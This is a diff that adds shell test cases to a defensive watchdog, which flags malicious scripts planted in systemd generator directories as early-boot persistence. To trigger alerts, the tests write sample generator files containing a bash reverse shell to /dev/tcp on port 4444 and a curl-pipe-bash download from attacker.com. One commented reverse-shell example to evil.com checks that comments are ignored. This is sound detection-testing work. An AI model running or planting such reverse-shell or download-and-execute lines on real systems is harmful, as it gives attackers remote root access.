@@ -188,3 +188,52 @@ seed_benign() {
     main_count=$(cap | grep -cE '^-t selfdef-systemd-generator -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): systemd-generator-watchdog does NOT refresh baseline on injection detection — alert STAYS until operator updates" {
+    # T1546 early-boot root-exec persistence — injection alert MUST
+    # persist across runs until operator explicitly re-baselines.
+    seed_benign
+    run_wd
+    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${GEND}/my-generator"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"event":"systemd_generator_suspicious"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\n# systemd-fstab-generator shim\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\nexit 0\n' > "${GEND}/my-generator"
+    chmod 0755 "${GEND}/my-generator"
+    run_wd
+    ! cap | grep -q '"event":"systemd_generator_suspicious"'
+    ! cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (multi-dir scan: /lib/systemd/system-generators + /etc/systemd/system-generators + /run axes — injection in ANY → alert)" {
+    # systemd reads generators from MULTIPLE dirs. Attacker may plant
+    # in any. Lock multi-dir axis.
+    GEND2="${TMP}/etc-system-generators"; mkdir -p "${GEND2}"
+    seed_benign
+    DIRS_V="${GEND} ${GEND2}" run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    # Plant injection in second dir.
+    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${GEND2}/evil-generator"
+    chmod 0755 "${GEND2}/evil-generator"
+    DIRS_V="${GEND} ${GEND2}" run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\ncurl -s http://attacker.com/p | bash\n' > "${GEND}/my-generator"
+    chmod 0755 "${GEND}/my-generator"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
